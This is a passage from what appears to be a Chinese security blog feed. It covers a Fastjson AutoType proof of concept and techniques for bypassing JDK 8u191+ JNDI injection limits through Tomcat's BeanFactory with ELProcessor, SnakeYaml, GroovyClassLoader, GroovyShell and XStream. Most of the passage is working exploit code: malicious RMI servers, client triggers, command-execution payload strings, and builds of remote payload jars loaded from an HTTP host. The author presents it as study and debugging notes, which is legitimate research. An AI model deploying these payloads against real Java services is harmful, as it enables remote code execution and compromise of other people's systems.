class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Poc:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        String s=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;jmx.cmd\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240327001042.png" alt="image.png"></p>
<h2 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h2><p>[[类加载机制#BCEL ClassLoader]]</p>
<p>参考:</p>
<ul>
<li>[[类加载机制#BCEL在FastJson的利用]]</li>
<li><a href="https://www.cnblogs.com/nice0e3/p/14776043.html#0x00-%E5%89%8D%E8%A8%80">https://www.cnblogs.com/nice0e3/p/14776043.html#0x00-%E5%89%8D%E8%A8%80</a></li>
<li><a href="https://www.anquanke.com/post/id/232774">https://www.anquanke.com/post/id/232774</a></li>
<li><a href="https://paper.seebug.org/1155/">https://paper.seebug.org/1155/</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDI绕过高版本jdk限制1</title>
    <url>/2024/04/01/JNDI%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%871/</url>
    <content><![CDATA[<h2 id="限制"><a href="#限制" class="headerlink" title="限制:"></a>限制:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</span><br><span class="line"></span><br><span class="line">JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</span><br></pre></td></tr></table></figure>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>jdk8u121-jdk8u191: 就是把rmi协议改成ldap协议就行</p>
<p>jdk8u191之后:</p>
<h3 id="本地类作为Reference-Factory"><a href="#本地类作为Reference-Factory" class="headerlink" title="本地类作为Reference Factory"></a>本地类作为Reference Factory</h3><p>那些类的要求:</p>
<ul>
<li>传入的 Factory 类必须实现 ObjectFactory 接口类,至少有一个getObjectInstance()方法</li>
<li>恶意类的只有一个参数,参数类型是String.class的可以执行危险函数</li>
</ul>
<h4 id="ELProcessor"><a href="#ELProcessor" class="headerlink" title="ELProcessor"></a>ELProcessor</h4><p>poe.xml:<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>com.springsource.org.apache.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这里直接抄的Drun1baby师傅的代码:<br>服务端:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">// JNDI 高版本 jdk 绕过服务端</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testbypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*]Evil RMI Server is Listening on port: 1099&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry( <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 强制将&#x27;x&#x27;属性的setter从&#x27;setX&#x27;变为&#x27;eval&#x27;</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">// 利用表达式执行命令</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.newInstance().getEngineByName(\&quot;JavaScript\&quot;)&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;[*]Evil command: calc&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteObj&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>客户端:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testbypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>lookup处和NamingManage的getObjectInstance()处下断点<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329014035.png" alt="image.png"><br>调试的时候进入:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329014337.png" alt="image.png"></p>
<p>通过 <code>loadClass()</code> 方法来加载我们传入的 <code>org.apache.naming.factory.BeanFactory</code> 类，然后新建该类实例并将其转换成 <code>ObjectFactory</code> 类型，也就是说，<strong>我们传入的 Factory 类必须实现 ObjectFactory 接口类、而 <code>org.apache.naming.factory.BeanFactory</code> 正好满足这一点</strong><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329014425.png" alt="image.png"></p>
<p>然后退回NamingManager类接着走下面,进入BeanFactory的getObjectInstance()方法里:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329014601.png" alt="image.png"><br>这里首先就判断ref是不是ResourceRef的子类,这也是为什么我们的payload构造的是ResourceRef对象<br>后面进行了一系列的赋值操作<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329014731.png" alt="image.png"><br>ra变量是我们传入的forceString的addr值,后面的for循环会将我们传入的x=eval分割开,propName是”eval”,param是”x”,这里的propName本来是x的set方法:setX,这里被换成了eval()方法,后面把它push进入foreced这个HashMap里面去</p>
<p>==这里有个点就是这个method的方法是通过propName来确定的,参数类型找的是String.class<br>所以我们找到目标类是那些只有一个参数,参数类型是String.class的可以执行恶意代码的类<br>而这里是用的javax.el.ELProcessor.eval()方法就满足条件==</p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329015133.png" alt="image.png"><br>然后有一个非常多嵌套的do while循环,我们的e变量有五个数组,四个的addrType都是while判断语句里的,只有最后一个x不是,可以跳出循环<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329015332.png" alt="image.png"><br>后面就是调用恶意eval方法了,value就是我们传入的恶意表达式<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329015413.png" alt="image.png"><br>成功弹出计算器</p>
<h4 id="SnakeYaml"><a href="#SnakeYaml" class="headerlink" title="SnakeYaml"></a>SnakeYaml</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>原理都是利用本地类,这里找到的是org.yaml.snakeyaml.Yaml().load(String)<br>服务端:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ldapbypass</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">tomcat_snakeyaml</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.yaml.snakeyaml.Yaml&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8888/yaml-payload.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=load&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, yaml));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry( <span class="number">1099</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ldapbypass.tomcat_snakeyaml());</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteObj&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>客户端:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testbypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// lookup参数注入触发</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>yaml-payload.jar的GitHub地址: <a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a><br>编译打包:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329165602.png" alt="image.png"></p>
<h4 id="GroovyClassLoader"><a href="#GroovyClassLoader" class="headerlink" title="GroovyClassLoader"></a>GroovyClassLoader</h4><p>poe.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>服务端:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ldapbypass</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">tomcatGroovyClassLoader</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=addClasspath,b=loadClass&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;Evil&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry( <span class="number">1099</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ldapbypass.tomcatGroovyClassLoader());</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteObj&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>客户端:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testbypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// lookup参数注入触发</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>要提前写好Evil.grovvy<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@groovy.transform.ASTTest(value=&#123;assert Runtime.getRuntime().exec(&quot;calc&quot;)&#125;)</span><br><span class="line">class Person&#123;&#125;</span><br></pre></td></tr></table></figure><br>开启临时服务器,注意同目录不要有Evil.class,不然会优先访问Evil.class不会触发漏洞<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240329173505.png" alt="image.png"></p>
<h4 id="GroovyShell"><a href="#GroovyShell" class="headerlink" title="GroovyShell"></a>GroovyShell</h4><p>还是和一个包,不用到依赖了,就是换个类和方法,这里用的方法是<code>groovy.lang.GroovyShell.evaluate</code><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.api.ha.StickyFeature;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ldapbypass</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">tomcatGroovyClassLoader</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyShell&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=evaluate&quot;</span>));</span><br><span class="line">        String script=String.format(<span class="string">&quot;&#x27;%s&#x27;.execute()&quot;</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, script));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry( <span class="number">1099</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ldapbypass.tomcatGroovyClassLoader());</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteObj&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>客户端代码一样的,这回不需要Evil.groovy文件</p>
<h4 id="XStream"><a href="#XStream" class="headerlink" title="XStream"></a>XStream</h4><p><code>com.thoughtworks.xstream.XStream().fromXML(String)</code>方法也可以<br>poe.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>就修改下那个返回ResourceRef对象的方法,其他的都一样的步骤,这里直接贴的原文的:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">tomcat_xstream</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;com.thoughtworks.xstream.XStream&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;unserializable-parents/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;java.util.PriorityQueue&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;size&gt;2&lt;/size&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;int&gt;3&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;handler class=&#x27;sun.tracing.NullProvider&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;active&gt;true&lt;/active&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;probes&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;class&gt;java.lang.Comparable&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;name&gt;compareTo&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;parameter-types&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;class&gt;java.lang.Object&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/parameter-types&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;sun.tracing.dtrace.DTraceProbe&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;proxy class=&#x27;java.lang.Runtime&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;implementing__method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;class&gt;java.lang.Runtime&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;name&gt;exec&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;parameter-types&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;class&gt;java.lang.String&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/parameter-types&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/implementing__method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/sun.tracing.dtrace.DTraceProbe&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/probes&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;/handler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;string&gt;calc&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/java.util.PriorityQueue&gt;\n&quot;</span> +</span><br><span class="line">                <span 